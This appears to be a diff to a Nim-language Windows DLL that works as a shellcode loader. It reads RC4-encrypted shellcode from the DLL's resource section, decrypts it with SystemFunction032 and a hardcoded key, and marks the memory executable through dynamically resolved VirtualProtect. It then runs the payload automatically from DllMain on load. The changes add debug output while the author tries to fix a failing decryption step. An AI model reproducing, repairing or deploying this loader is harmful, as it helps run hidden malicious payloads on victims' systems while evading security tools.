@@ -2,15 +2,15 @@ import winim
 import nimcrypto
 import includes/DLoader
 import includes/rc4
+import strutils
 
 func toByteSeq*(str: string): seq[byte] {.inline.} =
   ## Converts a string to the corresponding byte sequence.
   @(str.toOpenArrayByte(0, str.high))
 
-when defined(gcc) and defined(windows):
-  {.link: "resource.o"}
-
 # const encContent = slurp("encContent.bin")
+
+var currentModule: HINSTANCE
 
 type
     USTRING* = object
@@ -22,7 +22,7 @@ var keyString: USTRING
 var imgString: USTRING
 
 # Same Key
-var keyBuf: array[7, char] = [char 't', 'e', 's', 't', 'K', 'e', 'y']
+var keyBuf: array[16, char] = [char 't', 'e', 's', 't', 'K', 'e', 'y','t', 'e', 's', 't', 'K', 'e', 'y', 't', 'e']
 
 keyString.Buffer = cast[PVOID](&keyBuf)
 keyString.Length = 16
@@ -60,18 +60,6 @@ VirtualProtect_p = cast[VirtualProtect_t](cast[LPVOID](get_function_address(cast
 #let shellcode: seq[byte] = 
 # let shellcode: seq[byte] = encContent.toByteSeq
 
-var resourceId = 3
-var resourceType = 10
-
-# Get pointer to encrypted shellcode in .rsrc section
-var myResource: HRSRC = FindResource(cast[HMODULE](NULL), MAKEINTRESOURCE(resourceId), MAKEINTRESOURCE(resourceType))
-
-var myResourceSize: DWORD = SizeofResource(cast[HMODULE](NULL), myResource)
-
-var hResource: HGLOBAL = LoadResource(cast[HMODULE](NULL), myResource)
-
-var shellcode = LockResource(hResource)
-
 proc NimMain() {.cdecl, importc.}
 
 proc execute(): void =
@@ -92,29 +80,68 @@ proc execute(): void =
     dctx.clear()
     ]#
 
+    var resourceId = 100
+    var resourceType = 10
+
+    # Get pointer to encrypted shellcode in .rsrc section
+    echo "currentModule is: ", currentModule
+    var myResource: HRSRC = FindResource(cast[HMODULE](currentModule), MAKEINTRESOURCE(resourceId), MAKEINTRESOURCE(resourceType))
+
+    if myResource == 0:
+      echo "FindResource failed!"
+      echo GetLastError()
+
+    var myResourceSize: DWORD = SizeofResource(cast[HMODULE](currentModule), myResource)
+
+    if myResourceSize == 0:
+      echo "SizeOfResource failed!"
+      echo GetLastError()
+
+    var hResource: HGLOBAL = LoadResource(cast[HMODULE](currentModule), myResource)
+    if hResource == 0:
+      echo "LoadResource failed!"
+      echo GetLastError()
+    else:
+      echo "hResource at: ", toHex(hResource)
+
+    #var shellcode = LockResource(hResource)
+    
     var oldProtect: DWORD
 
     let buffer = VirtualAlloc_p(cast[LPVOID](0), cast[SIZE_T](myResourceSize), MEM_COMMIT, PAGE_READ_WRITE)
-    copyMem(buffer, shellcode, myResourceSize)
-
+    let memBuff: int = cast[int](buffer)
+    echo "Mem buffer at: ", memBuff.toHex
+    echo "VA Called!"
+    copyMem(buffer, cast[LPVOID](hResource), myResourceSize)
+    echo "CopyMem Called!"
     imgString.Buffer = buffer
     imgString.Length = myResourceSize
     imgString.MaximumLength = myResourceSize
 
-    SystemFunction032(addr imgString, addr keyString)
-    
-    discard VirtualProtect_p(buffer, cast[SIZE_T](myResourceSize), PAGE_EXECUTE_READ, addr oldProtect)
+    echo "imgString is: ", repr &imgString
+    #echo "imgString location: ", toHex(cast[int](&imgString)) 
+    echo "keyString is: ", repr &keyString
+    echo "keyString location: ", toHex(cast[int](&keyString))
+    echo "keyString Buffer Location: ", toHex(cast[int](&keyString.Buffer))
 
+    #Decryption failing!
+    SystemFunction032(&imgString, &keyString)
+    echo "SF032 Called!"
+
+    discard VirtualProtect_p(buffer, cast[SIZE_T](myResourceSize), PAGE_EXECUTE_READ, addr oldProtect)
+    echo "VP Called!"
     #let tHandle = CreateThread(NULL, 0, cast[LPTHREAD_START_ROUTINE](buffer), NULL, 0, NULL)
     #WaitForSingleObject(tHandle, INFINITE)
     # Works
     let f = cast[proc(){.nimcall.}](buffer)
     f()
+    echo "SC Executed!"
     
 
 proc DllMain(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID) : BOOL {.stdcall, exportc, dynlib.} =
   NimMain()
+  currentModule = hinstDLL
+  echo "hinstDLL is: ", hinstDLL
   if fdwReason == DLL_PROCESS_ATTACH:
     execute()
-
   return true
